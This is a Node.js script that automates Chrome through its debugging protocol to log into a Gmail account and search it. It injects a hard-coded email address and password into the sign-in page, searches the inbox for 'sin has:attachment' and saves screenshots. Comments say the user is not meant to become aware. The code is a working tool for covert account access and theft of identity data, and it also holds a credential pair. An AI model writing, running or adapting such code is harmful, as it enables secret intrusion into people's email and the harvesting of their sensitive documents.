// start "" /min "C:\Program Files\Adobe\Adobe Creative Cloud Experience\libs\node.exe" --inspect-brk G:\WORKING\hacking_WORK\DevOps\git_repo\mothershipassets\nodehostrelay.cmdslist.js
/* add to launch.json
        {
            "name": "Attach to Command Line",
            "type": "node",
            "request": "attach",
            "port": 9229,
            "skipFiles": ["<node_internals>/**"],
            "restart": true,
            "preLaunchTask": "Run My Script",
            "env": {
                "NODE_PATH": "${workspaceFolder}/node_modules"
            },
        },

    tasks.json
    {
        "version": "2.0.0",
        "tasks": [
            {
            "label": "Run My Script",
            "type": "shell",
            "command":"${file}",
            "isBackground": true,
            "args": ["--inspect-brk=9229"],
            "options": {
                "shell": {
                "executable": "C:\\Program Files\\Adobe\\Adobe Creative Cloud Experience\\libs\\node.exe"
                }
            }

            }
        ]
    }
*/

debugger;

// need to verify how profiles are maintained -- GMail logins across session boundaries
// we don't want user to become aware

let helper = require("./nodehostrelay.helper.js");
let helper_ws = require("./nodehostrelay.helper.ws.js");
let helper_ps = require("./nodehostrelay.helper.ps.js");
let scripts = require("./gmail_hack_scripts.js");
let fs = require('node:fs');
const path = require("path");


let debugport = 9223;

helper.logmsg("starting cmdslist");

function keepRunning() {
    helper.logmsg("looping... " + helper.getTimestamp());

    setTimeout(keepRunning, 1000);
}

async function get_gmail_signin_pos() {
    let command = helper_ws.runtime_eval(scripts.signinbtncoords());
    let response = await helper_ws.ws_send_cmd(command);

    if (!response) {
        throw new Error("response is null");
    }

    if (response && Object.hasOwn(response, "error")) {
        throw new Error(response["error"]);
    }

    if (!response?.result?.result?.type == "object") {
        throw new Error("not able to extract coords for ");
    }

    let coords = response.result?.result.value;
    let x_pos = (coords.left + coords.right) / 2;
    let y_pos = (coords.top + coords.bottom) / 2;

    return { x_pos: x_pos, y_pos: y_pos };
}

async function search_gmail_inbox(searchterm) {
    
    let script = `let searchbox = document.querySelector('input.searchboxInputFontClass.gb_Je.aJh.afOp8c');
        searchbox.value = "${searchterm}";

        const enterEvent = new KeyboardEvent('keydown', {
            key: 'Enter',
            code: 'Enter',
            keyCode: 13,
            which: 13,
            bubbles: true
        });

        searchbox.dispatchEvent(enterEvent);
    `;

    let command = helper_ws.runtime_eval(script);
    let response = await helper_ws.ws_send_cmd(command);
    return response;
}

// Screen A: body text = "Learn more" "Agree" "No thanks" "Sign in" "Create an account"
//           url = "https://workspace.google.com/intl/en-US/gmail/"
//           title = "Gmail: Secure, AI-Powered Email for Everyone | Google Workspace"
// Screen B: signin page --> "Email or phone" --> has email address input box
// Screen C: "Choose an account" --> select from list
// Screen D: GMail inbox --> no sign in required
// https://accounts.google.com/v3/signin/accountchooser?continue=https://mail.google.com/mail/u/0/&emr=1&followup=https://mail.google.com/mail/u/0/&osid=1&passive=1209600&service=mail&flowName=GlifWebSignIn&flowEntry=ServiceLogin&dsh=S1630951736:1788122351418800
// Screen E: inbox with search results

async function main() {
    try {
        // let ret = await helper.kill_chrome();

        // chrome won't allow multiple access to same user data dircd 
        let procs = await helper_ps.activate_chrome(
            "https://www.bing.com/",
            debugport,
            false,
            true,
            true,
            1
        );

        if (!procs || procs.length == 0) {
            throw new Error(
                `could not launch or find valid chrome process with debug port ${debugport}`
            );
        }

        let ws = await helper_ws.connectToChrome(debugport);

        await helper_ws.waitForSocket();

        let response = await helper_ws.setAutoAttach();

        command = helper_ws.create_new_tab("https://www.gmail.com"); // helper.create_new_window("https://www.gmail.com");
        response = await helper_ws.ws_send_cmd(command, true);

        await helper_ws.waitForSession();
        await helper_ws.enableDomains();

        let targetInfo = await helper_ws.getTargetInfo();
        let text = await helper_ws.getBodyText();

        if ( helper_ws.isInitPage(text, targetInfo.url, targetInfo.title) ) {

            let coords = await get_gmail_signin_pos();
            let x_pos = coords.x_pos;
            let y_pos = coords.y_pos;
            response = await helper_ws.click(x_pos, y_pos);

            targetInfo = await helper_ws.getTargetInfo();
            text = await helper_ws.getBodyText();
        }
        
        if ( helper_ws.isSigninPage(text) ) {
            
            // opens new tab
            let script = scripts.submit_username("michaelbradfield2@gmail.com");
            command = helper_ws.runtime_eval(script);
            response = await helper_ws.ws_send_cmd(command);

            targetInfo = await helper_ws.getTargetInfo();

            script = scripts.submit_password("ebed068653673bbea79bf1ee0b365362");
            command = helper_ws.runtime_eval(script);
            response = await helper_ws.ws_send_cmd(command);            
    
            targetInfo = await helper_ws.getTargetInfo();
            // text = await helper_ws.getBodyText();
        }
        
        await delay(2000);

        if ( helper_ws.isInboxPage(targetInfo) ) {
            response = await search_gmail_inbox('sin has:attachment'); // has:attachment filename:pdf in:sent to:me after:YYYY/MM/DD before:YYYY/MM/DD 

            targetInfo = await helper_ws.getTargetInfo();
            // title ='Search results - michaelbradfield2@gmail.com - Gmail'
            // https://mail.google.com/mail/u/0/#search/sin+has%3Aattachment'
        }

        command = helper_ws.getscreenshot();
        response = await helper_ws.ws_send_cmd(command);

        let data = response?.result?.data;

        let buffer = Buffer.from(data, 'base64');
        fs.writeFileSync(path.join(helper.scriptdirpath,'screenshot_'+helper.getTimestamp()+'.jpg'), buffer);

        helper.logmsg("pass");
    } catch (err) {
        helper.logmsg(err);
    }
}

(async () => {
    await main();
})();

keepRunning();
